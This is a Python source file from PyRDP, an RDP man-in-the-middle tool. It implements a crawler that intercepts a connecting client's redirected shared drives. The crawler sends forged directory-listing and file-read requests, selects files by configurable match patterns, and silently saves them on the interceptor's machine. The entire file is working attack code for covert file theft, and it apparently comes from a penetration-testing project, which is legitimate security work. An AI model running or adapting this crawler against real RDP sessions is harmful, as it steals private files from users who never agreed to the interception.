#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#
from collections import defaultdict
from logging import LoggerAdapter
from pathlib import Path
from typing import BinaryIO, Dict, List, Optional, Set

from pyrdp.enum.virtual_channel.device_redirection import DeviceType
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM, DeviceRedirectionMITMObserver
from pyrdp.mitm.state import RDPMITMState
from pyrdp.pdu import DeviceAnnounce

import fnmatch

class VirtualFile:
    """
    Component used to simplify syntax and wrap common file and directory attributes
    """
    def __init__(self, deviceID: int, name: str, filePath: str, isDirectory: bool):
        """
        :param deviceID: ID of the device used.
        :param filePath: Unix-style path of the file.
        :param isDirectory: True if the file is a directory.
        """

        self.deviceID = deviceID
        self.name = name
        self.path = filePath
        self.isDirectory = isDirectory

class FileCrawler(DeviceRedirectionMITMObserver):
    """
    Component used to automatically crawl each shared drives based on user-configurable patterns.
    For each shared drives, we start by listing the root directory.

    When listing a directory, we queue up files and directory in different queues. If they matched a "match pattern",
        files go into the file download queue (matchedFileQueue),
        directories go in another download queue to be recursively downloaded (downloadDirectories),
        and unmatched directories goes in the unvisitedDirectory, to be crawled later.

    Directories matching an "ignore pattern" won't be added to the unvisitedDirectory queue.

    When listing a directory from downloadDirectories, each of the result are automatically
        flagged for download and put in the appropriate download queue.

    When done downloading files and directories, we do the same process for every unvisited directory in the unvisitedDirectory queue.
    """

    def __init__(self, log: LoggerAdapter, config: MITMConfig, state: RDPMITMState):
        super().__init__()

        self.log = log
        self.state = state
        self.config = config
        self.devices: Dict[int, VirtualFile] = {}
        self.deviceRedirection: Optional[DeviceRedirectionMITM] = None

        # Pending crawler requests
        self.fileDownloadRequests: Dict[int, Path] = {}
        self.directoryListingRequests: Dict[int, Path] = {}
        self.directoryListingLists = defaultdict(list)

        # Download management
        self.downloadFiles: Dict[str, BinaryIO] = {}
        self.downloadDirectories: Set[int] = set()

        # Crawler detection patterns
        self.matchPatterns: List[str] = []
        self.ignorePatterns: List[str] = []

        # Crawler queues
        self.matchedFileQueue: List[VirtualFile] = []
        self.matchedDirectoryQueue: List[VirtualFile] = []
        self.unvisitedDirectory: List[VirtualFile] = []
        self.unvisitedDrive: List[VirtualFile] = []

    def setDeviceRedirectionComponent(self, deviceRedirection: DeviceRedirectionMITM):
        if self.deviceRedirection:
            self.deviceRedirection.removeObserver(self)

        if deviceRedirection:
            deviceRedirection.addObserver(self)

        self.deviceRedirection = deviceRedirection
        if not self.matchPatterns and not self.ignorePatterns:
            self.preparePatterns()

    def preparePatterns(self):
        matchPath = None
        ignorePath = None

        # Get the default file in pyrdp/mitm/crawler_config
        if self.config.crawlerMatchFileName:
            matchPath = Path(self.config.crawlerMatchFileName).absolute()
        else:
            matchPath = Path(__file__).parent.absolute() / "crawler_config" / "match.txt"
        
        if self.config.crawlerIgnoreFileName:
            ignorePath = Path(self.config.crawlerIgnoreFileName).absolute()
        else:
            ignorePath = Path(__file__).parent.absolute() / "crawler_config" / "ignore.txt"

        self.log.info("Using match pattern file %(matchPath)s", {"matchPath": matchPath})
        self.matchPatterns = self.parsePatterns(matchPath)

        self.log.info("Using ignore pattern file %(ignorePath)s", {"ignorePath": ignorePath})
        self.ignorePatterns = self.parsePatterns(ignorePath)

    def parsePatterns(self, path: str) -> List[str]:
        patternList = []
        try:
            with open(path, "r") as f:
                for line in f:
                    if line[0] in ["#", " ", "\n"]:
                        continue

                    patternList.append(line[:-1].lower())
        except Exception as e:
            self.log.error("Failed to open file %(path)s : %(exception)s", {"path": path, "exception": str(e)})

        return patternList

    def dispatchDownload(self):
        # Download a queued file
        if len(self.matchedFileQueue) != 0:
            file = self.matchedFileQueue.pop()

            self.downloadFile(file)
        # List a queued directory
        elif len(self.matchedDirectoryQueue) != 0:
            directory = self.matchedDirectoryQueue.pop()

            self.listDirectory(directory.deviceID, directory.path, True)
        # List an unvisited directory
        elif len(self.unvisitedDirectory) != 0:
            directory = self.unvisitedDirectory.pop()

            self.listDirectory(directory.deviceID, directory.path)
        # List an unvisited drive
        elif len(self.unvisitedDrive) != 0:
            drive = self.unvisitedDrive.pop()

            # TODO : Maybe dump whole drive if there isn't a lot of files?
            # Maybe if theres no directory at the root directory -> dump all?
            self.log.info("Begin crawling disk %(disk)s", {"disk" : drive.name})
            self.listDirectory(drive.deviceID, drive.path)
        else:
            self.log.info("Done crawling.")

    def addListingToDownloadQueue(self, requestID: int):
        directoryList = self.directoryListingLists.pop(requestID, {})

        for item in directoryList:
            if item.name in ["", ".", ".."]:
                continue

            if item.isDirectory:
                self.matchedDirectoryQueue.append(item)
            else:
                self.matchedFileQueue.append(item)
        self.dispatchDownload()

    def crawlListing(self, requestID: int):
        directoryList = self.directoryListingLists.pop(requestID, {})

        for item in directoryList:
            if item.name in ["", ".", ".."]:
                continue

            insensitivePath = item.path.lower()
            ignore = any(fnmatch.fnmatch(insensitivePath, p) for p in self.ignorePatterns)
            if ignore:
                continue

            matched = any(fnmatch.fnmatch(insensitivePath, p) for p in self.matchPatterns)
            if item.isDirectory:
                if matched:
                    self.log.info("Matched directory %(file)s", {"file" : item.path})
                    self.matchedDirectoryQueue.append(item)
                else:
                    self.unvisitedDirectory.append(item)
            else:
                if matched:
                    self.matchedFileQueue.append(item)
        self.dispatchDownload()

    def downloadFile(self, file: VirtualFile):
        remotePath = file.path
        basePath = f"{self.config.fileDir}/{self.log.sessionID}"
        localPath = f"{basePath}{remotePath}"

        self.log.info("Saving %(remotePath)s to %(localPath)s", {"remotePath": remotePath, "localPath": localPath})

        try:
            # Create parent directory, don't raise error if it already exists
            Path(localPath).parent.mkdir(parents=True, exist_ok=True)
            targetFile = open(localPath, "wb")
        except Exception as e:
            self.log.error("Cannot save file: %(exception)s", {"exception": str(e)})
            return

        self.downloadFiles[remotePath] = targetFile
        self.deviceRedirection.sendForgedFileRead(file.deviceID, remotePath)

    def listDirectory(self, deviceID: int, path: str, download: bool = False):
        listingPath = str(Path(path).absolute()).replace("/", "\\")

        if not listingPath.endswith("*"):
            if not listingPath.endswith("\\"):
                listingPath += "\\"

            listingPath += "*"

        requestID = self.deviceRedirection.sendForgedDirectoryListing(deviceID, listingPath)

        # If the directory is flagged for download, keep trace of the incoming request to trigger download.
        if download:
            self.downloadDirectories.add(requestID)

        self.directoryListingRequests[requestID] = Path(path).absolute()

    def onDeviceAnnounce(self, device: DeviceAnnounce):
        if device.deviceType == DeviceType.RDPDR_DTYP_FILESYSTEM:

            drive = VirtualFile(device.deviceID, device.preferredDOSName, "/", True)

            self.devices[drive.deviceID] = drive
            self.unvisitedDrive.append(drive)

            # If the crawler hasn't started, start one instance
            if len(self.devices) == 1:
                self.dispatchDownload()

    def onFileDownloadResult(self, deviceID: int, requestID: int, path: str, offset: int, data: bytes):
        remotePath = path.replace("\\", "/")

        targetFile = self.downloadFiles[remotePath]
        targetFile.write(data)

    def onFileDownloadComplete(self, deviceID: int, requestID: int, path: str, errorCode: int):
        remotePath = path.replace("\\", "/")

        file = self.downloadFiles.pop(remotePath)
        file.close()

        if errorCode != 0:
            self.log.error("Error happened when downloading %(remotePath)s. The file may not have been saved completely. Error code: %(errorCode)s", {
                "remotePath": remotePath,
                "errorCode": "0x%08lx",
            })

        self.dispatchDownload()

    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
        if requestID not in self.directoryListingRequests:
            return

        path = self.directoryListingRequests[requestID]
        filePath = path / fileName

        file = VirtualFile(deviceID, fileName, str(filePath), isDirectory)
        directoryList = self.directoryListingLists[requestID]
        directoryList.append(file)

    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
        self.directoryListingRequests.pop(requestID, {})

        # If directory was flagged for download
        if requestID in self.downloadDirectories:
            self.downloadDirectories.remove(requestID)
            self.addListingToDownloadQueue(requestID)
        else:
            self.crawlListing(requestID)
